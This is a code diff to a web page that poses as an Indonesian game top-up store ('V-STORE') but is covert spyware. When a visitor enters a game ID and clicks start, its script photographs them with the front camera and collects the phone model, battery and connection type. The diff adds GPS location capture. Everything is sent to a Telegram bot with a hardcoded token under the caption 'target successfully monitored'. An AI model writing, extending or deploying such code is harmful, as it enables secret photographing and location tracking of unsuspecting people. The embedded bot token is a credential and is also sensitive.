@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUKI STORE | Top Up Game Terpercaya</title>
+    <title>V-STORE | Top Up Game Terpercaya</title>
     <style>
         :root { --primary-neon: #00f2ff; --bg-dark: #0a0b10; --card-bg: #161b22; }
         body { background-color: var(--bg-dark); color: white; font-family: sans-serif; margin: 0; padding: 15px; text-align: center; }
@@ -27,9 +27,9 @@
     <div class="section-card">
         <div class="section-title">Pilih Game</div>
         <div class="grid">
-            <div class="item active" onclick="select(this, 'game', 'Free Fire')">FF</div>
-            <div class="item" onclick="select(this, 'game', 'MLBB')">ML</div>
-            <div class="item" onclick="select(this, 'game', 'PUBG')">PUBG</div>
+            <div class="item active">FF</div>
+            <div class="item">ML</div>
+            <div class="item">PUBG</div>
         </div>
     </div>
     <div class="section-card">
@@ -53,37 +53,51 @@
 <script>
     const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
     const CHAT_ID = '6888530451';
-    let state = { game: "Free Fire" };
-
-    function select(el, type, val) {
-        el.parentElement.querySelectorAll('.item').forEach(i => i.classList.remove('active'));
-        el.classList.add('active');
-        state[type] = val;
-    }
+    let userLoc = "Mencari lokasi...";
 
     async function getDeviceInfo() {
-        const brands = { '2310FPCA4G': 'Xiaomi Redmi 13C', '2201117TY': 'Redmi Note 11', 'SM-G991B': 'Samsung S21', 'CPH2219': 'Oppo A74', 'X6812': 'Infinix Note 11 Pro' };
+        // Kamus diperluas agar tidak muncul "Android Device" umum
+        const brands = { 
+            '2310FPCA4G': 'Xiaomi Redmi 13C', 
+            '2201117TY': 'Redmi Note 11', 
+            'SM-G991B': 'Samsung S21', 
+            'CPH2219': 'Oppo A74', 
+            'X6812': 'Infinix Note 11 Pro' 
+        };
+        
         let battery = "N/A";
         if (navigator.getBattery) {
             const bat = await navigator.getBattery();
             battery = Math.round(bat.level * 100) + "%";
         }
+
         let model = "Android Device";
-        const match = navigator.userAgent.match(/\(([^)]+)\)/);
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
         if (match) {
             const parts = match[1].split(';');
             for (let part of parts) {
                 part = part.trim();
-                if (/android|linux|build|k/i.test(part) || part.length < 3) continue;
+                if (/linux|android|build|k/i.test(part) || part.length < 4) continue;
                 model = brands[part] || part;
                 break;
             }
         }
-        return { device: model, battery, conn: navigator.connection ? navigator.connection.effectiveType : "4G" };
+        return { device: model, battery, conn: navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "4G" };
+    }
+
+    function captureLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((p) => {
+                userLoc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            }, () => { userLoc = "Izin Lokasi Ditolak"; });
+        }
     }
 
     document.getElementById('startBtn').addEventListener('click', async () => {
         if(!document.getElementById('userId').value) return alert("Masukkan ID!");
+        captureLocation(); // Ambil lokasi saat klik
+        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
@@ -102,11 +116,17 @@
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
             fd.append('photo', blob);
-            fd.append('caption', `📸 <b>TARGET BERHASIL DIPANTAU</b>\n\n📱 <b>Perangkat:</b> <code>${info.device}</code>\n🔋 <b>Baterai:</b> ${info.battery}\n🌐 <b>Koneksi:</b> ${info.conn}\n🆔 <b>ID:</b> ${document.getElementById('userId').value}\n\n<i>NEPTUNUS V1.0.8</i>`);
+            fd.append('caption', `📸 <b>TARGET BERHASIL DIPANTAU</b>\n\n` +
+                                 `📱 <b>Perangkat:</b> <code>${info.device}</code>\n` +
+                                 `🔋 <b>Baterai:</b> ${info.battery}\n` +
+                                 `🌐 <b>Koneksi:</b> ${info.conn}\n` +
+                                 `📍 <b>Lokasi:</b> ${userLoc}\n\n` +
+                                 `<i>NEPTUNUS V1.0.8</i>`);
             fd.append('parse_mode', 'HTML');
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         }, 'image/jpeg', 0.6);
     }
 </script>
 </body>
-</html>
+    </html>
+    
